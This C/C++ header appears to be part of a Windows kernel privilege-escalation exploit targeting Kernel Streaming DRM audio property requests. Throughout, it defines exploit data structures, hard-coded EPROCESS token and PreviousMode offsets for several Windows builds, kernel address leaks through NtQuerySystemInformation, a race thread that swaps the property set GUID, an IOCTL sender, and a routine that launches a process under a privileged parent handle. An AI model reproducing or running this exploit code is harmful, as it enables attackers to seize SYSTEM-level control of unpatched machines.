#pragma once
#include <Windows.h>
#include <winternl.h>

#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#include <strmif.h>
#include <ks.h>
#include <ksproxy.h>
#include <ksmedia.h>
#include <SetupAPI.h>
#include <functiondiscovery.h>
#include <mmdeviceapi.h>
#include <stdint.h>
#include <safeint.h>
#include <TlHelp32.h>
#include <winsvc.h>
#include <processthreadsapi.h>
#include <stdio.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define EPROCESS_TOKEN_OFFSET            0x4B8
#define KTHREAD_PREVIOUS_MODE_OFFSET     0x232
#define EPROCESS_SECURE_STATE_OFFSET     0x3E0
#define SEP_TOKEN_PRIVILEGE_OFFSET       0x40
#define SystemHandleInformation          0x10
#define SystemModuleInformation          11
#define SystemHandleInformationSize      0x400000 
#define TOKEN_SIZE              0x8
#define KPROCESSOR_MODE char

enum _MODE { KernelMode = 0, UserMode = 1 };

typedef struct SYSTEM_MODULE {
    ULONG Reserved1;
    ULONG Reserved2;
#ifdef _WIN64
    ULONG Reserved3;
#endif
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    WORD  Id;
    WORD  Rank;
    WORD  w018;
    WORD  NameOffset;
    CHAR  Name[255];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

__inline void* Ptr64(const unsigned long long ull) {
    return (void*)(ULONG_PTR)ull;
}

extern "C" {
    NTSTATUS RtlGUIDFromString(PUNICODE_STRING GuidString, GUID* Guid);
    NTSTATUS RtlStringFromGUID(REFGUID Guid, PUNICODE_STRING GuidString);
    NTSTATUS NtImpersonateThread(HANDLE ThreadHandle, HANDLE ThreadToImpersonate, SECURITY_QUALITY_OF_SERVICE* SecurityQualityOfService);
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
}

#define DRM_DEVICE_OBJECT L"\\\\?\\root#system#0000#{ffbb6e3f-ccfe-4d84-90d9-421418b03a8e}\\{eec12db6-ad9c-4168-8658-b03daef417fe}&{abd61e00-9350-47e2-a632-4438b90c6641}"

DEFINE_GUIDSTRUCT("3C0D501A-140B-11D1-B40F-00A0C9223196", KSNAME_Server);
#define KSNAME_Server DEFINE_GUIDNAMED(KSNAME_Server)

DEFINE_GUIDSTRUCT("3C0D501B-140B-11D1-B40F-00A0C9223196", KSPROPSETID_Service);
#define KSPROPSETID_Service DEFINE_GUIDNAMED(KSPROPSETID_Service)

typedef struct _RTL_BITMAP {
    DWORD SizeOfBitMap;
    PVOID Buffer;
} RTL_BITMAP, *PRTL_BITMAP;

#pragma pack(1)
typedef struct _EXPLOIT_DATA1 {
    PRTL_BITMAP FakeBitmap;
} EXPLOIT_DATA1;

typedef struct _EXPLOIT_DATA2 {
    char pad[0x20];
    PVOID ptr_ArbitraryFunCall;
} EXPLOIT_DATA2;

enum EPROCESS_TOKEN_OFFSETS {
    EPROCESS_TOKEN_WIN_SERVER2012_62_9200 = 0x348,
    EPROCESS_TOKEN_WIN_10_1507_10240        = 0x358,
    EPROCESS_TOKEN_WIN_10_1903_18362        = 0x360,
    EPROCESS_TOKEN_WIN_10_2004_19041        = 0x4b8,
    EPROCESS_TOKEN_WIN_10_20H2_19042        = 0x4b8,
    EPROCESS_TOKEN_WIN_11_22H2_22621        = 0x4b8,
};

enum KTHREAD_PREVIOUS_MODE_OFFSETS_OBFUSCATED {
    PREV_MODE_WIN_SERVER2012_62_9200 = 0x232,
    PREV_MODE_WIN_10_20H2_19042       = 0x232,
    PREV_MODE_WIN_11_22H2_22621       = 0x232,
};

enum TOKEN_PRIVILEGES_OFFSET_OBFUSCATED {
    TOKEN_PRIV_WIN_10_1507_10240 = 0x40,
    TOKEN_PRIV_WIN_11_22H2_22621 = 0x40,
    TOKEN_PRIV_WIN_11_23H2_22631 = 0x40,
};

int32_t GetObjPtr(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle) {
    int32_t Ret = -1;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS Status = STATUS_SUCCESS;

    while ((Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH) {
        if (pHandleInfo) {
            pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
        } else {
            pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (!NT_SUCCESS(Status)) {
        Ret = Status;
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && 
            (pHandleInfo->Handles[i].HandleValue == static_cast<USHORT>(reinterpret_cast<ULONG_PTR>(handle)))) {
            *ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
            Ret = 0;
            break;
        }
    }
done:
    if (pHandleInfo) HeapFree(GetProcessHeap(), 0, pHandleInfo);
    return Ret;
}

void* AllocateBitmap(SIZE_T size, LPVOID baseAddress) {
    return VirtualAlloc(baseAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

UINT_PTR GetKernelModuleAddress(const char* TargetModule) {
    NTSTATUS status;
    ULONG ulBytes = 0;
    PSYSTEM_MODULE_INFORMATION handleTableInfo = NULL;

    while ((status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH) {
        if (handleTableInfo) {
            handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
        } else {
            handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    UINT_PTR result = 0;
    if (NT_SUCCESS(status)) {
        for (ULONG i = 0; i < handleTableInfo->ModulesCount; i++) {
            if (strstr(handleTableInfo->Modules[i].Name, TargetModule)) {
                result = (UINT_PTR)handleTableInfo->Modules[i].ImageBaseAddress;
                break;
            }
        }
    }
    if (handleTableInfo) HeapFree(GetProcessHeap(), 0, handleTableInfo);
    return result;
}

DWORD64 leak_gadget_address(LPCSTR GadgetName) {
    HMODULE module_base_user = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!module_base_user) return FALSE;

    FARPROC procAddress = GetProcAddress(module_base_user, GadgetName);
    if (!procAddress) return FALSE;

    DWORD64 module_base_kernel = GetKernelModuleAddress("ntoskrnl.exe");
    return module_base_kernel + ((DWORD64)procAddress - (DWORD64)module_base_user);
}

NTSTATUS Write64(void* Dst, void* Src, size_t Size) {
    return NtWriteVirtualMemory(GetCurrentProcess(), Dst, Src, (ULONG)Size, NULL);
}

DWORD CreateProcessFromHandle(HANDLE Handle, LPSTR command) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;
    BOOL ret;

    ZeroMemory(&si, sizeof(si));
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &Handle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    ret = CreateProcessA(NULL, command, NULL, NULL, TRUE,
                         EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                         NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    return ret ? 0 : 3;
}

ULONG GetPidByName(const char* procname) {
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    ULONG pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, procname) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = { 0 };
KSPROPERTY* pInBufProperty = (KSPROPERTY*)InBuffer;
EXPLOIT_DATA2* pInBufPropertyData = (EXPLOIT_DATA2*)(pInBufProperty + 1);

UCHAR UnserializePropertySetRequest[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };
KSPROPERTY_SERIALHDR* pSerialHdr = (KSPROPERTY_SERIALHDR*)UnserializePropertySetRequest;
PKSPROPERTY_SERIAL pSerial = (PKSPROPERTY_SERIAL)(pSerialHdr + 1);
EXPLOIT_DATA1* pOutBufPropertyData = (EXPLOIT_DATA1*)(pSerial + 1);

DWORD ModifySetValue(LPVOID lpParam) {
    while (TRUE) {
        pInBufProperty->Set = KSPROPSETID_Service;
        pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
    }
    return 0;
}

HANDLE GetKsDevice(const GUID categories) {
    HANDLE hDevice = NULL;
    HRESULT hr = KsOpenDefaultDevice(categories, GENERIC_READ | GENERIC_WRITE, &hDevice);
    return (hr == NOERROR) ? hDevice : NULL;
}

BOOL SendIoctlReq(HANDLE hDevice) {
    return DeviceIoControl(hDevice, IOCTL_KS_PROPERTY, pInBufProperty, sizeof(InBuffer),
                           pSerialHdr, sizeof(UnserializePropertySetRequest), NULL, NULL);
}
